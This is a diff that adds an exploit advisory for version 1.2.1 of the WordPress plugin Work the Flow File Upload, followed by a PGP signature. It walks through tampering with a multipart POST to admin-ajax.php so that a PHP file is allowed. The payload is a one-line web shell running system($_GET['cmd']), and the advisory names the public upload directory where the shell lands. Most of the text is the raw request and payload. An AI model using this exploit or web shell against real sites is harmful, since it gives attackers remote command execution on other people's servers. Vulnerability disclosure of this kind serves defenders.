@@ -1,0 +1,55 @@
+# Author: nopesled
+# Date: 24/04/14
+# Software: https://wordpress.org/plugins/work-the-flow-file-upload/
+# Company: http://wtf-fu.com/
+# Version: 1.2.1
+# Tested on: Windows 7
+# Vulnerability: Unrestricted File Upload
+
+
+Submit an image file via the wtf upload panel and intercept the POST request to /wp-admin/admin-ajax.php
+
+By editing the data from the control 'accept_file_types', we can upload normally disallowed filetypes such as PHP.
+
+Append '|php':
+
+- ----------------------------123456789123456\r\n
+Content-Disposition: form-data; name="accept_file_types"\r\n
+\r\n
+jpg|jpeg|mpg|mp3|png|gif|wav|ogg|php\r\n
+
+
+Now change the extension in the data for 'filename' to '.php' and enter your desired code like so
+
+- ----------------------------123456789123456\r\n
+Content-Disposition: form-data; name="files[]"; filename="illegal.php"\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+<?php\n
+system($_GET[\'cmd\']);\n
+?>\n
+- ----------------------------123456789123456--\r\n
+
+Submit this POST request and you will find your file in the directory:
+/wp-content/uploads/public/wtf-fu_files/default/
+
+It's not required to set the control 'deny_public_uploads' to true, because it still gets uploaded anyway regardless if it's enabled or not.
+
+###################################
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Signed.
+-----BEGIN PGP SIGNATURE-----
+Version: Keybase OpenPGP v0.1.11
+Comment: https://keybase.io/crypto
+
+wsBcBAABCgAGBQJTWQpLAAoJEOB0UMODnV4U7QIIAIKXDQVK8fIXY0BSO4ZrHq8L
+2a51JCVmpwBzrHVp87FCpYHcMXyuCXWi5joEbiJFVi5ojHTSii5ZwvBVJwvyoKcy
+jexj2IvMoC30zrgSdTu9/lMd1tYGYQCSlMubFvzE0edmDCo7fH2gF8Zvfw4Lj4ng
+KJOpB9HsvDUJVNlbDMl+MbGAW32m6BqG4ttdjE1bs1suDxb/JrS7okuHu1Qmpe0+
+Xp50x4wUVrZSeqT5VnWDWjox2BnSGEcAKbkjFeRDBpgJyeWJGH20jXb6m4sYNLDT
+gf9ml9oM5yncivMN2dJU+hp3Xyfp6rEute9jA+lcEMwZsyjlwAVFhszV4qh7X+o=
+=5nDI
+-----END PGP SIGNATURE-----
+###################################
